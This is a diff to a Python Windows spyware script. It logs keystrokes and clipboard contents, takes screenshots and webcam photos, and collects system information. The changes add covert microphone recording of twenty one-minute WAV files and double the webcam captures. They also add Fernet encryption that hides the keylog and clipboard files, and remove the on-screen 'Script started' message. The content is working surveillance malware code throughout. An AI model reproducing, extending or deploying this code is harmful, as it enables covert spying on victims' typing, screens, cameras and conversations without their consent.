@@ -4,7 +4,6 @@ import logging
 import requests
 import threading
 import pyaudio
-import wave
 import win32clipboard
 import time
 import platform
@@ -15,12 +14,15 @@ import psutil
 import os
 import cv2
 import pathlib
+import sounddevice
+import wavio
 
 
 from pynput import keyboard, mouse
 from pynput.keyboard import Key
 from cryptography.fernet import Fernet
 from PIL import ImageGrab
+from scipy.io.wavfile import write as write_rec
 
 
 
@@ -31,7 +33,7 @@ SCREEN = 'Screenshots'
 WEBCAM= 'WebcamPics'
 LOG_FILE = "keylogfile.txt"
 CLIPBOARD = "clipboard.txt"
-WAVE_OUTPUT_FILENAME = "output.wav"
+WAVE_OUTPUT_FILENAME = "audiofolder\\"
 ZIP = "test.zip"
 CHUNK = 4096
 FORMAT = pyaudio.paInt32
@@ -41,7 +43,6 @@ RATE = 48000
 
 #Initialize PyAudio
 audio = pyaudio.PyAudio()
-
 
 
 ############################################################# RETRIEVE INFORMATION #############################################################
@@ -84,24 +85,18 @@ def on_press(key):
 
 
 # Audio Recording
+# Loop that save a picture every 5 seconds
 def Audio():
-    try:
-        stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
-        with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
-            wf.setnchannels(CHANNELS)
-            wf.setsampwidth(audio.get_sample_size(FORMAT))
-            wf.setframerate(RATE)
-
-            print("Audio recording started. Press 'Esc' to stop.")
-            data = stream.read(CHUNK)
-            wf.writeframes(data)
-        
-        stream.stop_stream()
-        stream.close()
-    except Exception as e:
-        logging.error(f"Error occurred while recording audio: {e}")
-    finally:
-        audio.terminate()
+    pathlib.Path(WAVE_OUTPUT_FILENAME).mkdir(parents=True, exist_ok=True)
+    
+    fs = 44100  # Sampling frequency (samples per second)
+    seconds = 60  # Duration of the audio recording
+    
+    for x in range(20):
+        recording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
+        sounddevice.wait()  # Wait for the recording to finish
+        output_filename = f'{WAVE_OUTPUT_FILENAME}/mic_recording_{x}.wav'
+        wavio.write(output_filename, recording, fs, sampwidth=3)
 
 
 # Capture images from webcam
@@ -110,7 +105,7 @@ def webcam():
         pathlib.Path(WEBCAM).mkdir(parents=True, exist_ok=True)
         cam_path = 'WebcamPics\\'
         cam = cv2.VideoCapture(0)
-        for x in range(0, 10):
+        for x in range(20):
             ret, img = cam.read()
             file = (cam_path + '{}.jpg'.format(x))
             cv2.imwrite(file, img)
@@ -159,13 +154,25 @@ def screenshot():
             pic.save(screen_path + 'screenshot{}.png'.format(x))
             time.sleep(5)
 
-
     except Exception as e:
         print("Screenshots could not be saved: " + str(e))
 
+def encrypt():
+        files = [LOG_FILE, CLIPBOARD]
+
+        with open('keyfile.key', 'rb') as keyfile:
+            key = keyfile.read()
+
+        for file in files:
+            with open(file, 'rb') as plain_text:
+                data = plain_text.read()
+            encrypted = Fernet(key).encrypt(data)
+
+            with open('e_' + file, 'ab') as hidden_data:    # Appending to the end of the file if it exists
+                hidden_data.write(encrypted)
 
 
-# Main function
+# Main functionv 
 def main():
     try:
         # Log system information
@@ -177,28 +184,28 @@ def main():
         t2 = threading.Thread(target=webcam)
         t3 = threading.Thread(target=Audio)
         t4 = threading.Thread(target=screenshot)
+        t5= threading.Thread(target=encrypt)
 
         t1.start()
         t2.start()
         t3.start()
         t4.start()
+        t5.start()
 
         # Start the keyboard listener to log key presses
         with keyboard.Listener(on_press=on_press) as key_listener:
-            print("Script started. Press 'Esc' to stop.")
             key_listener.join()
 
-    except KeyboardInterrupt:
-        print("Control-C entered... Program exiting")
-    except Exception as e:
-        logging.exception(f"An error occurred: {str(e)}")
-    finally:
-        # Ensure stop_thread is set and threads are joined
         t1.join()
         t2.join()
         t3.join()
         t4.join()
+        t5.join()
 
+     
+
+    except Exception as e:
+        print(f"An error occurred: {str(e)}")
 
 
 if __name__ == '__main__':
@@ -209,3 +216,6 @@ if __name__ == '__main__':
             print("You forgot to generate the Key x)")
     except KeyboardInterrupt:
         print("Control-C entered... Program exiting")
+    except Exception as e:
+        logging.exception(f"An error occurred: {str(e)}")
+ 
